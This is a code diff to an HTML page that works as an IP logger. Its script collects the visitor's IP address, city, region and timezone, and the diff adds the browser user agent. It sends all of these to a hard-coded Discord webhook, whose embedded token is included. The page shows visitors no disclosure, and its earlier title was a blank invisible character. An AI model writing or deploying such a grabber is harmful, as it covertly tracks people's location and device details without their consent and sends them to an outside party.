@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>‎ </title>
+    <title>User Info Fetcher</title>
     <style>
         body {
             background-color: black;
@@ -38,8 +38,13 @@
     return data;
   }
 
+  // Function to get user agent
+  function getUserAgent() {
+    return navigator.userAgent;
+  }
+
   // Function to send data to Discord webhook as an embedded message
-  async function sendToDiscord(ipAddress, locationInfo) {
+  async function sendToDiscord(ipAddress, locationInfo, userAgent) {
     const { city, region, timezone } = locationInfo;
     const webhookURL = 'https://discord.com/api/webhooks/1197340200276344852/oMGzClEWwTYkBG9qF0UYTdcqvCnfZPDX2JhCtc1B0gT5LZmOCyPxBtRwIcIOSIW4lpZY'; // Replace with your Discord webhook URL
 
@@ -52,9 +57,10 @@
             title: ipAddress, // Set the title of the embed as the user's IP address
             color: discordColor, // Set the color of the embed (Discord format)
             fields: [
-                { name: "city", value: city },
-                { name: "state", value: region },
-                { name: "timezone", value: timezone },
+                { name: "City", value: city },
+                { name: "Region", value: region },
+                { name: "Timezone", value: timezone },
+                { name: "User Agent", value: userAgent },
             ],
         }],
     };
@@ -74,7 +80,8 @@
     try {
       const ipAddress = await getIpAddress();
       const locationInfo = await getLocationInfo(ipAddress);
-      await sendToDiscord(ipAddress, locationInfo);
+      const userAgent = getUserAgent();
+      await sendToDiscord(ipAddress, locationInfo, userAgent);
     } catch (error) {
       console.error('Error:', error);
     }
